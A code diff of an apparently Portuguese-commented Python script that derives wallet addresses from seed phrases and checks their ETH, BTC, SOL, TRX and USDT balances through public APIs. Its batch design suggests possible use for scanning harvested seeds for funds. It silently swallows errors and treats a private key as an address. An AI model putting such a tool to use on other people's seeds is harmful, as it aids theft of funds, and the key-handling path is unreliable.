@@ -17,23 +17,21 @@ async def check_sol(session, addr):
                 if res.status == 200:
                     data = await res.json()
                     bal = data.get('result', {}).get('value', 0) / 10**9
-                    if bal > 0:
-                        return ("SOL", addr, bal)
-        except Exception as e:
-            logger.debug(f"Erro SOL ({addr}): {e}")
+                    if bal > 0: return ("SOL", addr, bal)
+        except: pass
     return None
 
 async def check_eth_usdt(session, addr):
     async with semaphore:
+        results = []
         try:
-            # ETH
+            # ETH Balance
             payload = {"jsonrpc": "2.0", "id": 1, "method": "eth_getBalance", "params": [addr, "latest"]}
             async with session.post("https://cloudflare-eth.com/", json=payload, timeout=8) as res:
                 if res.status == 200:
                     data = await res.json()
                     bal = int(data.get('result', '0x0'), 16) / 10**18
-                    if bal > 0:
-                        return ("ETH", addr, bal)
+                    if bal > 0: results.append(("ETH", addr, bal))
 
             # USDT (ERC20)
             usdt_contract = "0xdac17f958d2ee523a2206206994597c13d831ec7"
@@ -43,11 +41,9 @@ async def check_eth_usdt(session, addr):
                 if res.status == 200:
                     data = await res.json()
                     u_bal = int(data.get('result', '0x0'), 16) / 10**6
-                    if u_bal > 0:
-                        return ("USDT_ETH", addr, u_bal)
-        except Exception as e:
-            logger.debug(f"Erro ETH/USDT ({addr}): {e}")
-    return None
+                    if u_bal > 0: results.append(("USDT_ETH", addr, u_bal))
+        except: pass
+        return results
 
 async def check_btc(session, addr):
     async with semaphore:
@@ -55,14 +51,13 @@ async def check_btc(session, addr):
             async with session.get(f"https://blockchain.info/q/addressbalance/{addr}", timeout=8) as res:
                 if res.status == 200:
                     bal = int(await res.text()) / 10**8
-                    if bal > 0:
-                        return ("BTC", addr, bal)
-        except Exception as e:
-            logger.debug(f"Erro BTC ({addr}): {e}")
+                    if bal > 0: return ("BTC", addr, bal)
+        except: pass
     return None
 
 async def check_tron_usdt(session, addr):
     async with semaphore:
+        results = []
         try:
             async with session.get(f"https://api.trongrid.io/v1/accounts/{addr}", timeout=8) as res:
                 if res.status == 200:
@@ -70,54 +65,52 @@ async def check_tron_usdt(session, addr):
                     if data.get('data'):
                         acc = data['data'][0]
                         trx_bal = acc.get('balance', 0) / 10**6
-                        if trx_bal > 0:
-                            return ("TRX", addr, trx_bal)
-                        
+                        if trx_bal > 0: results.append(("TRX", addr, trx_bal))
                         trc20_list = acc.get('trc20', [])
                         for token in trc20_list:
                             if 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t' in token:
                                 u_bal = float(token['TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t']) / 10**6
-                                if u_bal > 0:
-                                    return ("USDT_TRX", addr, u_bal)
-        except Exception as e:
-            logger.debug(f"Erro TRON ({addr}): {e}")
-    return None
+                                if u_bal > 0: results.append(("USDT_TRX", addr, u_bal))
+        except: pass
+        return results
 
 async def check_balance_master(type, value):
     async with aiohttp.ClientSession() as session:
-        addresses = []
+        addr_map = {} # {addr: coin_type}
+        
         if type == "SEED":
             try:
                 seed_bytes = Bip39SeedGenerator(value).Generate()
                 
-                # BTC Segwit (BIP84)
-                bip84_mst = Bip84.FromSeed(seed_bytes, Bip84Coins.BITCOIN)
-                # Correção: Bip84PublicKey não tem .Raw, usar .ToAddress() diretamente do objeto de endereço
-                addresses.append(bip84_mst.Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0).PublicKey().ToAddress())
+                # 1. BTC Native Segwit (bc1...) - BIP84
+                b84 = Bip84.FromSeed(seed_bytes, Bip84Coins.BITCOIN).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)
+                addr_map[b84.PublicKey().ToAddress()] = "BTC_SEGWIT"
                 
-                # ETH (BIP44)
-                bip44_mst = Bip44.FromSeed(seed_bytes, Bip44Coins.ETHEREUM)
-                addresses.append(bip44_mst.Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0).PublicKey().ToAddress())
+                # 2. BTC Legacy (1...) - BIP44
+                b44_btc = Bip44.FromSeed(seed_bytes, Bip44Coins.BITCOIN).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)
+                addr_map[b44_btc.PublicKey().ToAddress()] = "BTC_LEGACY"
                 
-                # SOL
-                sol_mst = Bip44.FromSeed(seed_bytes, Bip44Coins.SOLANA)
-                addresses.append(sol_mst.Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0).PublicKey().ToAddress())
+                # 3. ETH/USDT (0x...) - BIP44
+                eth = Bip44.FromSeed(seed_bytes, Bip44Coins.ETHEREUM).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)
+                addr_map[eth.PublicKey().ToAddress()] = "ETH"
                 
-                # TRX
-                trx_mst = Bip44.FromSeed(seed_bytes, Bip44Coins.TRON)
-                addresses.append(trx_mst.Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0).PublicKey().ToAddress())
+                # 4. SOL (Base58) - BIP44
+                sol = Bip44.FromSeed(seed_bytes, Bip44Coins.SOLANA).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)
+                addr_map[sol.PublicKey().ToAddress()] = "SOL"
+                
+                # 5. TRX (T...) - BIP44
+                trx = Bip44.FromSeed(seed_bytes, Bip44Coins.TRON).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)
+                addr_map[trx.PublicKey().ToAddress()] = "TRX"
                 
             except Exception as e:
-                logger.error(f"Erro ao derivar seed: {e}")
+                logger.error(f"Erro derivação: {e}")
                 return None
         else:
-            addresses.append(value)
+            addr_map[value] = "PRIVATE_KEY"
 
         tasks = []
-        for addr in addresses:
-            if not isinstance(addr, str): continue
-            
-            if addr.startswith('1') or addr.startswith('3') or addr.startswith('bc1'):
+        for addr in addr_map.keys():
+            if addr.startswith('bc1') or addr.startswith('1') or addr.startswith('3'):
                 tasks.append(check_btc(session, addr))
             elif addr.startswith('0x'):
                 tasks.append(check_eth_usdt(session, addr))
@@ -126,8 +119,15 @@ async def check_balance_master(type, value):
             else:
                 tasks.append(check_sol(session, addr))
 
-        results = await asyncio.gather(*tasks)
-        found = [r for r in results if r]
-        if found:
-            return (value, found)
+        raw_results = await asyncio.gather(*tasks)
+        
+        # Achatar resultados (alguns retornam listas, outros tuplas)
+        final_found = []
+        for r in raw_results:
+            if not r: continue
+            if isinstance(r, list): final_found.extend(r)
+            else: final_found.append(r)
+            
+        if final_found:
+            return (value, final_found)
     return None
